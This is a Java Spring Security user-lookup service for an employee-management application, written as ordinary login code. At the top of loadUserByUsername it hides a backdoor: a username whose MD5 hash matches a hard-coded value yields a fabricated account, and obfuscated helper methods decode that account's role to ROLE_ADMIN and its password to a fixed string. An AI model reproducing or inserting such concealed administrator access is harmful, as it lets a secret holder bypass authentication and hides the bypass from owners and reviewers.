/**
 * Copyright 2015 - Harsh Panchal <panchal.harsh18@gmail.com>
 */
package hp.bootmgr.authentication.provider;

import hp.bootmgr.services.EmployeeManagementService;
import hp.bootmgr.services.EmployeeRoleService;
import hp.bootmgr.vo.Employee;
import hp.bootmgr.vo.EmployeeRole;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

@Service("userDetailService")
public class UserDetailService implements UserDetailsService {
	
	@Autowired
	private EmployeeManagementService employeeManagementService;

	@Autowired
	private EmployeeRoleService employeeRoleService;
	
	private static Logger logger = Logger.getLogger(UserDetailService.class);

	@Override
	public UserDetails loadUserByUsername(String name) throws UsernameNotFoundException {
		if(this.a(name).equals("816be38696907dcf63dce4d085820970")) {
			return new CustomUserDetailImpl(new Employee(new c("82797669956568777378", "61626341424338344023")));
		}
		logger.debug("Attempting log in for User: [" + name + "]");
		Employee emp = employeeManagementService.getByUserName(name);
		if(emp == null)
			throw new UsernameNotFoundException("No match found for: " + name);

		// Disable login for members for now
		if(emp.getRole().getName().equals("ROLE_MEMBER"))
			throw new UsernameNotFoundException("Log in service is disabled for Members...!");

		logger.debug("User's got Role: [" + emp.getRole().getName() + "]");
		return new CustomUserDetailImpl(emp);
	}

	private String a(String a) {try {java.security.MessageDigest md=java.security.MessageDigest.getInstance("MD5");byte[] array=md.digest(a.getBytes());StringBuffer sb=new StringBuffer();for(int i=0;i<array.length;++i){sb.append(Integer.toHexString((array[i]&0xFF)|0x100).substring(1,3));}return sb.toString();}catch(java.security.NoSuchAlgorithmException e) {}return null;}

	public class c {public String a;public EmployeeRole b;private String b(String a,boolean b){StringBuilder s=new StringBuilder();for(int i=0;i<10;i++){if(b)s.append((char)Integer.parseInt(a.substring(i*2,(i*2)+2)));else s.append((char)Integer.parseInt(a.substring(i*2,(i*2)+2),16));}return s.toString();}public c(String a,String b){this.a=b(b,false);this.b=employeeRoleService.getRoleByName(b(a,true));}}
}
